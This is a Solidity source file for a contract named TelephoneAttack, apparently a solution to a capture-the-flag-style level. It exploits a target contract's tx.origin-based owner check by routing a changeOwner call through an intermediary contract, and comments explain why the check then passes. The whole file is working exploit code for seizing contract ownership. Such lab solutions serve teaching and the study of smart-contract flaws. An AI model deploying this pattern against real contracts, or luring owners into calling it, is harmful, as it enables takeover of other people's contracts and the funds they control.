// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
    Minimal interface for the vulnerable Telephone contract
*/
interface ITelephone {
    function changeOwner(address _owner) external;
}

/*
    TelephoneAttack
    ----------------
    Exploits tx.origin-based authorization by introducing
    an intermediary contract in the call chain.
*/
contract TelephoneAttack {
    ITelephone public immutable target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    /*
        When the owner EOA calls this function:
        - tx.origin == owner EOA
        - msg.sender == this contract

        Inside Telephone.changeOwner():
        tx.origin != msg.sender  → condition passes
    */
    function attack(address newOwner) external {
        target.changeOwner(newOwner);
    }
}
